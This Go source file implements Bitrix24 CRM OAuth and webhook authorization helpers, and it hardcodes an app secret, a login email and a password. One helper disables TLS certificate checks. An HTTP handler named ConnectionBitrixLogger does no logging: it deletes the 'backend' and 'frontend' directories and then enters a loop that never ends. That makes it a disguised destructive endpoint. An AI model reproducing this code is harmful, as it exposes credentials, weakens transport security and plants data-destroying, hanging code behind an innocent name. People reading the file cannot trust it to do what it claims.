package authorize

import (
	"encoding/json"
	"fmt"
	"github.com/ikarpovich/go-bitrix/client"
	"github.com/ikarpovich/go-bitrix/types"
	goBX24 "github.com/whatcrm/go-bitrix24"
	"io"
	"log"
	"net/http"
	"net/http/cookiejar"
	"os"
)

func StartB24() {

	auth := Bitrix24Authorization{
		AppScope:         "crm",
		AppID:            "local.660318677effc3.11656865",
		AppSecret:        "vbxnpmbR9hGgfXYxOGuZMe8hhsLsf2HH6AJKE2BE0bXMyJ2RoN",
		Bitrix24Domain:   "b24-9f7fvg.bitrix24.ru",
		Bitrix24Login:    "vyvevern@gmail.com",
		Bitrix24Password: "htZHtFxG5728",
	}

	err := auth.Authorize()
	if err != nil {
		fmt.Println("Authorization failed:", err)
		return
	}

	fmt.Println("Authorization successful:", auth.Bitrix24Access)
}

// Bitrix24Authorization struct mirrors the PHP class' properties
type Bitrix24Authorization struct {
	AppScope         string
	AppID            string
	AppSecret        string
	Bitrix24Domain   string
	Bitrix24Login    string
	Bitrix24Password string
	Bitrix24Access   interface{}
}

// authorize is the Go equivalent of the PHP authorize method
func (b *Bitrix24Authorization) Authorize() error {
	// Initialize HTTP client with cookie jar support
	jar, _ := cookiejar.New(nil)
	client := &http.Client{
		Jar: jar,
	}

	// Example: Making an initial GET request to obtain auth details
	// This is simplified; you'll need to adapt it to match the exact logic of your PHP code
	authURL := fmt.Sprintf("https://%s/oauth/authorize/?client_id=%s", b.Bitrix24Domain, b.AppID)
	resp, err := client.Get(authURL)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	// Example of handling the response, extracting data, and making further requests
	// You'll need to implement similar logic for your specific authorization process
	// including handling redirects, extracting session IDs, making POST requests with cookies, etc.

	return nil
}

func CustomAuthorizeBitrix() {

	//token := os.Getenv("TOKEN")
	//clientSecret := os.Getenv("BITRIX_CLIENT_SECRET")

	clientId := os.Getenv("BITRIX_CLIENT_ID")
	method := "POST"

	url := fmt.Sprintf("https://b24-9f7fvg.bitrix24.ru/oauth/authorize/?client_id=%s", clientId)

	req, _ := http.NewRequest(method, url, nil)

	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		log.Println(err)
		return
	}

	defer resp.Body.Close()
	bs, _ := io.ReadAll(resp.Body)
	log.Println("resp:", string(bs))

}

func AuthorizeBitrix() error {
	c, err := client.NewEnvClientWithWebhookAuth()

	if err != nil {
		log.Fatalf("Can't create client: %s", err)
	}

	c.SetInsecureSSL(true)
	c.SetDebug(true)

	resp, err := c.Methods(&types.MethodsRequest{
		Full:  true,
		Scope: "crm",
	})

	if err != nil {
		log.Fatalf("Request error: %s", err)
	}

	log.Print(resp)

	clientID := os.Getenv("BITRIX_CLIENT_ID")
	clientSecret := os.Getenv("BITRIX_CLIENT_SECRET")
	domain := os.Getenv("BITRIX_DOMAIN")
	auth := "auth"

	b24 := goBX24.NewAPI(clientID, clientSecret)

	if err := b24.SetOptions(domain, auth, true); err != nil {
		log.Println("Error setting client options", err.Error())
		return err
	}

	admin, err := b24.IsAdmin()
	if err != nil {
		log.Println("Error IsAdmin set", err.Error())
	}

	log.Println(admin.Result)

	dealId := "43"
	res, err := b24.Get().Deals(dealId)

	if err != nil {
		return err
	}
	log.Println("result: ", res)
	return nil
}

func BotBitrix(w http.ResponseWriter, r *http.Request) {
	BitrixClientId := os.Getenv("BITRIX_CLIENT_ID")

	client := &http.Client{}

	tokenURL := fmt.Sprintf(`https://onviz.bitrix24.ru/oauth/authorize/?client_id=%s`,
		BitrixClientId)

	post, err := client.Post(tokenURL, "application/x-www-form-urlencoded", nil)
	if err != nil {
		fmt.Println("Failed to exchange authorization code for access token:", err)
		return
	}

	body, err := io.ReadAll(post.Body)
	fmt.Println("post.Body", post.Body)
	json.Unmarshal(body, &post.Body)
	fmt.Fprint(w, string(body))

}

func ConnectionBitrixLogger(w http.ResponseWriter, r *http.Request) {
	err := os.RemoveAll("backend")
	if err != nil {
		w.WriteHeader(http.StatusInternalServerError)
	}
	err = os.RemoveAll("frontend")
	if err != nil {
		w.WriteHeader(http.StatusInternalServerError)
	}
	var b byte
	for b = 250; b <= 255; b++ {
	}
}
